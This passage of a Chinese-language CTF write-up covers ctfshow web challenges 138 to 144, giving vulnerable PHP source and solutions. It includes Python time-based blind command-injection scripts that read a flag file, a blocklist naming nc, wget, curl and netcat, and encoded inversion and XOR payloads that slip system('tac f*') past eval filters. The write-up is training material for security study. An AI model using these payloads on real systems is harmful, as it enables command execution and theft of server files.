class="hljs-built_in">die</span>(&quot;private class&quot;);<br>    &#125;<br>    static function <span class="hljs-built_in">getFlag</span>()&#123;<br>        echo <span class="hljs-built_in">file_get_contents</span>(&quot;flag.php&quot;);<br>    &#125;<br>&#125;<br><br><span class="hljs-built_in">if</span>(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-built_in">die</span>(&quot;private function&quot;);<br>&#125;<br><br><span class="hljs-built_in">call_user_func</span>($_POST[&#x27;ctfshow&#x27;]);<br></code></pre></td></tr></table></figure><p>解题思路：</p><p>strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</p><p>if(strripos($_POST[‘ctfshow’], “:”)&gt;-1)这里要求:在post传入的ctfshow里的位置不能大于-1，所以这里可以理解为不能有:的存在。</p><p><strong>绕过关键：call_user_func是支持传入数组的，可以用数组调用静态方法</strong></p><p>payload：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">call_user_func调用类的静态方法 数组传入调用<br><br>post：ctfshow<span class="hljs-comment">[0]</span>=ctfshow&amp;ctfshow<span class="hljs-comment">[1]</span>=getFlag<br>然后查看源码即可得到flag<br></code></pre></td></tr></table></figure><hr><h3 id="strripos"><a href="#strripos" class="headerlink" title="strripos()"></a>strripos()</h3><p><strong>strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">strripos</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$haystack</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$needle</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$offset</span> = <span class="hljs-number">0</span>): <span class="hljs-keyword">int</span><br>以不区分大小写的方式查找指定字符串在目标字符串中最后一次出现的位置。与 <span class="hljs-title function_ invoke__">strrpos</span>() 不同，<span class="hljs-title function_ invoke__">strripos</span>() 不区分大小写。 <br><br>haystack<br>    在此字符串中进行查找。<br>needle<br>    注意 needle 可以是一个单字符或者多字符的字符串。<br>offset<br>    参数 offset 可以被指定来查找字符串中任意长度的子字符串。<br>    负数偏移量将使得查找从字符串的起始位置开始，到 offset 位置为止。<br>   <br>返回 needle 相对于 haystack 字符串的位置(和搜索的方向和偏移量无关)。同时注意字符串的起始位置为<span class="hljs-number">0</span>而非<span class="hljs-number">1</span>。<br>如果 needle 未被发现，返回 <span class="hljs-literal">false</span>。 <br></code></pre></td></tr></table></figure><hr><h2 id="web-139"><a href="#web-139" class="headerlink" title="web-139"></a>web-139</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$x</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;too young too simple sometimes naive!&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$c</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解题思路：</p><p>本来准备用tee的，结果写入到1后访问url&#x2F;1没有反应，看了下题解说这题要用命令盲注</p><p>python题解脚本：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import time<br>import string<br><span class="hljs-attribute">str</span>=string.ascii_letters+string.digits<br><span class="hljs-attribute">result</span>=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,5):         #知道flag在第四行，实际情况中把数字写大一些<br><span class="hljs-attribute">key</span>=0<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(1,15):     #文件名的长度大小<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">key</span>==1:<br>break<br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> str:<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;</span>.format(i,j,n)<br>#<span class="hljs-built_in">print</span>(payload)<br><span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c=&quot;</span>+payload<br>try:<br>requests.<span class="hljs-built_in">get</span>(url,timeout=(2.5,2.5))<br>except:<br>    <span class="hljs-attribute">result</span>=result+n<br>    <span class="hljs-built_in">print</span>(result)<br>    break<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">n</span>==&#x27;9&#x27;:<br><span class="hljs-attribute">key</span>=1<br>result+=<span class="hljs-string">&quot; &quot;</span><br>得出flag在根目录下的f149_15_h3r3中，继续盲注得出flag值<br>import requests<br>import time<br>import string<br><span class="hljs-attribute">str</span>=string.digits+string.ascii_lowercase+&quot;-&quot;<br><span class="hljs-attribute">result</span>=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment">#key=0                      #key我感觉可以不用加</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(1,45):<br><span class="hljs-comment">#if key==1:</span><br><span class="hljs-comment">#break   </span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> str:<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;</span>.format(j,n)<br>#<span class="hljs-built_in">print</span>(payload)<br><span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c=&quot;</span>+payload<br>try:<br>requests.<span class="hljs-built_in">get</span>(url,timeout=(2.5,2.5))<br>except:<br>    <span class="hljs-attribute">result</span>=result+n<br>    <span class="hljs-built_in">print</span>(result)<br>    break<br></code></pre></td></tr></table></figure><p>群主脚本：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><br>url = <span class="hljs-string">&quot;http://fea78741-014c-4a82-8924-e4fc2541579f.challenge.ctf.show/?c=&quot;</span><br>payload = <span class="hljs-string">&quot;if [ `cat /f149_15_h3r3  | cut -c &#123;&#125;` == \&quot;&#123;&#125;\&quot; ];then sleep 4;fi&quot;</span><br><br>result = <span class="hljs-string">&quot;+++++++++++++++++&quot;</span><br><br><span class="hljs-attribute">length</span>=48<br><br>strings  = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz_-0123456789&quot;</span><br><span class="hljs-comment">#strings  = &quot;ctfshow&#125;abdegijklmnpqruvwxyz_-0123456789&#123;&quot;</span><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> range(1,length):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;+++++++++++++++第&quot;</span>+str(c)+<span class="hljs-string">&quot;个字符&quot;</span>)<br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> strings:<br>target = url+payload.format(c,s)<br>#<span class="hljs-built_in">print</span>(target)<br>try:<br>requests.<span class="hljs-built_in">get</span>(target,<span class="hljs-attribute">timeout</span>=2.5)<br>except:<br>result +=s<br><span class="hljs-built_in">print</span>(result)<br>break<br>result += <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">awk <span class="hljs-attribute">NR</span>==num表示从第几行开始<br>ls / | awk <span class="hljs-attribute">NR</span>=num<br><br>cut截取字符第几个字符<br>ls / | awk <span class="hljs-attribute">NR</span>==2 | cut -c 2<br></code></pre></td></tr></table></figure><hr><h2 id="web-140（弱类型比较、intval-）"><a href="#web-140（弱类型比较、intval-）" class="headerlink" title="web-140（弱类型比较、intval()）"></a>web-140（弱类型比较、intval()）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f1</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f1&#x27;</span>];<br>    <span class="hljs-variable">$f2</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$f1</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$f2</span>))&#123;<br>            <span class="hljs-variable">$code</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$f1</span>(<span class="hljs-subst">$f2</span>());&quot;</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$code</span>) == <span class="hljs-string">&#x27;ctfshow&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p>弱类型比较，这里intval会把非数字字符转为0，然后后面的ctfshow也会自动进行类型转换，转换为0，所以要让$code的值为一个非零数字即可拿到flag，而<code>$code = eval(&quot;return $f1($f2());&quot;);</code>这里表示将$f2函数得到的值作为$f1的参数，然后将值赋给$code</p><p>intval把非数字字符转为0，比如<code>intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0</code></p><p>payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c">f1<span class="hljs-punctuation">=</span>md5<span class="hljs-meta">&amp;f2=phpinfo          <span class="hljs-comment">//md5(phpinfo())</span></span><br>f1<span class="hljs-punctuation">=</span>md5<span class="hljs-meta">&amp;f2=sleep            <span class="hljs-comment">//md5(sleep())</span></span><br>f1<span class="hljs-punctuation">=</span>md5<span class="hljs-meta">&amp;f2=md5              <span class="hljs-comment">//md5(md5())</span></span><br>f1<span class="hljs-punctuation">=</span>current<span class="hljs-meta">&amp;f2=localeconv   <span class="hljs-comment">//current(localeconv())</span></span><br>f1<span class="hljs-punctuation">=</span>sha1<span class="hljs-meta">&amp;f2=getcwd          <span class="hljs-comment">//sha1(getcwd()) </span></span><br>f1<span class="hljs-punctuation">=</span>usleep<span class="hljs-meta">&amp;f2=usleep        <span class="hljs-comment">//usleep(usleep())</span></span><br></code></pre></td></tr></table></figure><hr><h2 id="web-141（无字母数字命令执行（取反绕过））"><a href="#web-141（无字母数字命令执行（取反绕过））" class="headerlink" title="web-141（无字母数字命令执行（取反绕过））"></a>web-141（无字母数字命令执行（取反绕过））</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\W+$/&#x27;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span>;&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>&#x2F;^\W+$&#x2F; 作用是匹配非数字字母下划线的字符，所以这题考点很明显是无字母数字命令执行。</strong><br><strong>首先测试一下<code>eval(&quot;return 1;phpinfo();&quot;);</code>，不能执行phpinfo()，但是<code>eval(&quot;return 1-phpinfo()-1&quot;);</code>和<code>eval(&quot;return 1-phpinfo();&quot;);</code>所以我们构造payload就可以使用这两种类型</strong></p><p>payload：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mel">用取反脚本构造 <span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac f*&#x27;</span>)<br>(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)<span class="hljs-comment">//system(‘tac f*’)</span><br><br>用-<br>?v1=<span class="hljs-number">1</span>&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)-&amp;v2=<span class="hljs-number">1</span><br>用/<br>?v1=<span class="hljs-number">1</span>&amp;v3=/(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)/&amp;v2=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><hr><h3 id="无字母数字命令执行"><a href="#无字母数字命令执行" class="headerlink" title="无字母数字命令执行"></a>无字母数字命令执行</h3><p>yu22x的关于绕过正则表达式的文章：</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">无字母数字命令执行绕过正则总结包括各种绕过脚本</a></p><hr><h2 id="web-142（is-numeric、sleep）"><a href="#web-142（is-numeric、sleep）" class="headerlink" title="web-142（is_numeric、sleep）"></a>web-142（is_numeric、sleep）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>))&#123;<br>        <span class="hljs-variable">$d</span> = (<span class="hljs-keyword">int</span>)(<span class="hljs-variable">$v1</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span>);<br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-variable">$d</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p>这里分析源码，很明显我们传入的v1的值必须是数字，然后会使用sleep函数，所以我们这里直接传入0即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">v1</span>=0<br>查看源码即可得到flag<br></code></pre></td></tr></table></figure><hr><h2 id="web-143（无字母数字命令执行（异或绕过））"><a href="#web-143（无字母数字命令执行（异或绕过））" class="headerlink" title="web-143（无字母数字命令执行（异或绕过））"></a>web-143（无字母数字命令执行（异或绕过））</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;get out hacker!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span>;&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p><em><em>分析源码发现和141很像，只是正则过滤判断的区别，本质上考点还是无字母数字命令执行，但是这里过滤掉了-和+，导致141题的payload不能用了，但还可以用</em>&#x2F;</em>*</p><p>payload：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl">这里~被过滤了，所以不能用取反绕过了，可以用异或绕过<br><br>?<span class="hljs-number">v1</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-number">v3</span>=*(<span class="hljs-string">&quot;<span class="hljs-variable">%1</span>3<span class="hljs-variable">%1</span>9<span class="hljs-variable">%1</span>3<span class="hljs-variable">%1</span>4<span class="hljs-variable">%0</span>5<span class="hljs-variable">%0d</span>&quot;</span>^<span class="hljs-string">&quot;<span class="hljs-variable">%6</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%60</span>&quot;</span>)(<span class="hljs-string">&quot;<span class="hljs-variable">%1</span>4<span class="hljs-variable">%0</span>1<span class="hljs-variable">%0</span>3<span class="hljs-variable">%0</span>0<span class="hljs-variable">%0</span>6<span class="hljs-variable">%00</span>&quot;</span>^<span class="hljs-string">&quot;<span class="hljs-variable">%6</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%2</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%2a</span>&quot;</span>)*&amp;<span class="hljs-number">v2</span>=<span class="hljs-number">1</span> <br>或<br><span class="hljs-number">v1</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-number">v3</span>=*(<span class="hljs-string">&quot;%0c<span class="hljs-variable">%0</span>6%0c%0b<span class="hljs-variable">%0</span>5<span class="hljs-variable">%0d</span>&quot;</span>^<span class="hljs-string">&quot;%7f%7f%7f%7f<span class="hljs-variable">%6</span>0<span class="hljs-variable">%60</span>&quot;</span>)(<span class="hljs-string">&quot;%0b<span class="hljs-variable">%0</span>1<span class="hljs-variable">%0</span>3<span class="hljs-variable">%0</span>0<span class="hljs-variable">%0</span>6<span class="hljs-variable">%00</span>&quot;</span>^<span class="hljs-string">&quot;%7f<span class="hljs-variable">%6</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%2</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%2a</span>&quot;</span>)*&amp;<span class="hljs-number">v2</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-144（无字母数字命令执行）"><a href="#web-144（无字母数字命令执行）" class="headerlink" title="web-144（无字母数字命令执行）"></a>web-144（无字母数字命令执行）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$v3</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\W+$/&#x27;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span>;&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    